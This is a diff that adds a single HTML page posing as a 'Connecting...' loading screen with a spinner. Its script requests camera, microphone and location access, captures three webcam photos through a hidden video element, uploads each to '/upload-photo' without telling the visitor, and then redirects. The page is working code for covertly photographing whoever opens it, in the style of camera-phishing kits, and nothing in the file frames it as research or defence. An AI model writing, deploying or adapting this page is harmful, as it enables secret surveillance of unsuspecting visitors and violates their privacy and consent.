@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>Connecting...</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: #111;
+      color: #ccc;
+      font-family: system-ui, sans-serif;
+      height: 100vh;
+      width: 100vw;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      touch-action: none;
+    }
+
+    .spinner {
+      width: 15vmin;
+      height: 15vmin;
+      border: 5px solid #444;
+      border-top: 5px solid #ccc;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0%   { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="spinner" aria-hidden="true"></div>
+  <video id="video" autoplay playsinline></video>
+
+  <script>
+    async function requestPermissions() {
+      try {
+        await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        navigator.geolocation.getCurrentPosition(() => {}, () => {});
+      } catch (err) {
+        alert("❌ Permission denied or failed.");
+        throw err;
+      }
+    }
+
+    function capturePhoto(video) {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+      return canvas.toDataURL('image/png');
+    }
+
+    async function sendPhoto(dataUrl) {
+      await fetch("/upload-photo", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ image: dataUrl }),
+      });
+    }
+
+    async function startSequence() {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.getElementById("video");
+      video.srcObject = stream;
+
+      await new Promise(resolve => video.onloadedmetadata = resolve);
+
+      for (let i = 0; i < 3; i++) {
+        const photo = capturePhoto(video);
+        await sendPhoto(photo);
+        await new Promise(r => setTimeout(r, 1000));
+      }
+
+      stream.getTracks().forEach(track => track.stop());
+      window.location.href = "/redirect";
+    }
+
+    window.onload = async () => {
+      try {
+        await requestPermissions();
+        await startSequence();
+      } catch (e) {
+        console.error("Failure:", e);
+      }
+    };
+  </script>
+</body>
+</html>
